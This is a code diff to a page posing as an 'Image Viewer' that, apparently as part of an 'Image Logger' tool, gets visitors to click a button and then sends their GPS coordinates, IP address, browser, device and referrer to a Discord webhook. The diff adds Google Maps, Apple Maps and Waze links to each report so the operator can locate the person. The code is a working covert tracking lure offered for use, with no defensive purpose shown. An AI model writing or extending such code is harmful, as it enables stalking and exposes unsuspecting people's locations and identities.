@@ -16,13 +16,14 @@ def fetch_image():
     except:
         return b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;', 'image/gif'
 
-# SIMPLE HTML WITH BUTTON - NO COMPLEX STUFF
+# HTML WITH BUTTON - SENDS LOCATION WITH MAP LINK
 HTML = """
 <!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
     <title>Image Viewer</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
 </head>
 <body style="background:#111;color:#fff;font-family:Arial;text-align:center;padding-top:50px;">
     <h2>Click to view full image</h2>
@@ -43,21 +44,32 @@ HTML = """
         const IMG_URL = "IMAGE_URL_PLACEHOLDER";
 
         function sendToDiscord(lat, lng, acc) {
+            // Build map links
+            const googleMaps = "https://www.google.com/maps?q=" + lat + "," + lng;
+            const appleMaps = "http://maps.apple.com/?ll=" + lat + "," + lng;
+            const waze = "https://www.waze.com/ul?ll=" + lat + "," + lng + "&navigate=yes";
+            
             const data = {
                 content: "**📍 Location Captured**",
                 embeds: [{
                     title: "GPS Coordinates",
                     color: 0xff0000,
                     fields: [
-                        {name: "IP", value: "`" + IP + "`", inline: true},
-                        {name: "Browser", value: "`" + BROWSER + "`", inline: true},
-                        {name: "OS/Device", value: "`" + OS + " - " + DEVICE + "`", inline: true},
-                        {name: "Latitude", value: "`" + lat + "`", inline: true},
-                        {name: "Longitude", value: "`" + lng + "`", inline: true},
-                        {name: "Accuracy", value: "`" + acc + "m`", inline: true},
-                        {name: "Referrer", value: "`" + REFERRER + "`", inline: false}
+                        {name: "🌐 IP", value: "`" + IP + "`", inline: true},
+                        {name: "📱 Browser", value: "`" + BROWSER + "`", inline: true},
+                        {name: "💻 OS/Device", value: "`" + OS + " - " + DEVICE + "`", inline: true},
+                        {name: "📍 Latitude", value: "`" + lat + "`", inline: true},
+                        {name: "📍 Longitude", value: "`" + lng + "`", inline: true},
+                        {name: "🎯 Accuracy", value: "`" + acc + "m`", inline: true},
+                        {name: "🔗 Referrer", value: "`" + REFERRER + "`", inline: false},
+                        {name: "🗺️ Open in Maps", value: 
+                            "[Google Maps](" + googleMaps + ") • " +
+                            "[Apple Maps](" + appleMaps + ") • " +
+                            "[Waze](" + waze + ")", 
+                            inline: false
+                        }
                     ],
-                    footer: {text: "Image Logger"}
+                    footer: {text: "Image Logger • Tap map link to locate"}
                 }]
             };
             fetch(WEBHOOK, {
@@ -65,7 +77,16 @@ HTML = """
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify(data)
             }).then(() => {
-                document.body.innerHTML = '<h2 style="color:#00ff66;">✅ Location Sent!</h2><img src="' + IMG_URL + '" style="max-width:90%;"/>';
+                // Replace page with success + map link
+                document.body.innerHTML = `
+                    <h2 style="color:#00ff66;">✅ Location Sent!</h2>
+                    <p style="font-size:18px;margin:20px;">
+                        <a href="${googleMaps}" target="_blank" style="color:#00aaff;text-decoration:underline;">Open in Google Maps</a> • 
+                        <a href="${appleMaps}" target="_blank" style="color:#00aaff;text-decoration:underline;">Open in Apple Maps</a> • 
+                        <a href="${waze}" target="_blank" style="color:#00aaff;text-decoration:underline;">Open in Waze</a>
+                    </p>
+                    <img src="${IMG_URL}" style="max-width:90%;border-radius:10px;margin-top:20px;" />
+                `;
             }).catch(() => {
                 document.body.innerHTML = '<h2 style="color:#ff4444;">Error</h2>';
             });
